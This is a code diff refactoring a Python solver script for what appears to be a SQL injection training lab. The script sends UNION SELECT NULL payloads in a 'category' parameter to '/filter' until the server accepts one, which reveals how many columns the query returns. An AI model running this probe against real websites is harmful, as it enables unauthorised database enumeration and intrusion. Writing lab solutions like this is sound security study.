@@ -4,31 +4,42 @@ SQL injection UNION attack, determining the number of columns
 returned by the query
 """
 
+from functools import lru_cache
 from typing import Generator, NamedTuple
 
 import lab_02
-
-NullCount = NamedTuple("NullCount", [("count", int), ("nulls", str)])
 
 # pylint: disable=too-few-public-methods
 class Lab(lab_02.Lab):
     """Wrapper"""
 
+    NullCount = NamedTuple("NullCount", [("count", int), ("nulls", str)])
+
+    def __init__(self, key: str, path: str) -> None:
+        super().__init__()
+        self.key = key
+        self.path = path
+
     @staticmethod
-    def _null_generator() -> Generator[NullCount, None, None]:
+    def _null_generator() -> Generator["Lab.NullCount", None, None]:
         """A bunch of NULLs"""
         count = 0
         while True:
             count += 1
-            yield NullCount(count, ",".join(["NULL"] * count))
+            yield Lab.NullCount(count, ",".join(["NULL"] * count))
 
-    def column_count(self, key: str, path: str) -> int:
+    @staticmethod
+    def _dict_to_str(payload: dict) -> str:
+        return "&".join("%s=%s" % (k, v) for k, v in payload.items())
+
+    @lru_cache()
+    def column_count(self) -> int:
         """Get the number of columns"""
         query_template = "'+UNION+SELECT+{}--"
         for repeated_null in self._null_generator():
-            payload = {key: query_template.format(repeated_null.nulls)}
-            payload_str = "&".join("%s=%s" % (k, v) for k, v in payload.items())
-            response = self.session.get(self.url + path, params=payload_str)
+            payload = {self.key: query_template.format(repeated_null.nulls)}
+            payload_str = self._dict_to_str(payload)
+            response = self.session.get(self.url + self.path, params=payload_str)
             if response.status_code == 200:
                 return repeated_null.count
             if response.status_code == 404:
@@ -37,8 +48,8 @@ class Lab(lab_02.Lab):
 
 def main() -> None:
     """Entry point"""
-    site = Lab()
-    print(site.column_count(key="category", path="/filter"))
+    site = Lab(key="category", path="/filter")
+    print(site.column_count())
 
 if __name__ == "__main__":
     main()
